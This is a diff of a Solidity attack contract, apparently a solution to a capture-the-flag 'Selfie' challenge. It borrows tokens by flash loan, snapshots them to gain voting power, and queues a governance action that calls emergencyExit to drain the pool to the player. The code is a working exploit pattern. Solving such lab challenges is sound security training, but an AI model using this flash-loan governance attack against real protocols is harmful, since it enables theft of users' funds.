@@ -33,8 +33,12 @@ contract AttackSelfie is IERC3156FlashBorrower {
         governance = _governance;
     }
 
-    function start () external {
-        pool.flashLoan(IERC3156FlashBorrower(this), address(poolToken), 1500000 ether, "0x00");
+    function start (address player) external {
+        //here we construct the payload so the governance contract can execute what we want. We want to call the emergencyExit function with the player address
+        bytes memory signature = hex"a441d067000000000000000000000000";
+        bytes memory addrBytes = abi.encodePacked(player);
+        bytes memory data =  abi.encodePacked(signature, addrBytes);
+        pool.flashLoan(IERC3156FlashBorrower(this), address(poolToken), 1500000 ether, data);
     }
 
     function onFlashLoan(
@@ -52,7 +56,7 @@ contract AttackSelfie is IERC3156FlashBorrower {
         poolToken.snapshot();
 
         // 2. Make a proposal to SimpleGovernance
-        governance.queueAction(address(pool), 0, "0x00");
+        governance.queueAction(address(pool), 0, data);
 
         //3. Pay back to the pool:
         poolToken.approve(address(pool), 1500000 ether);
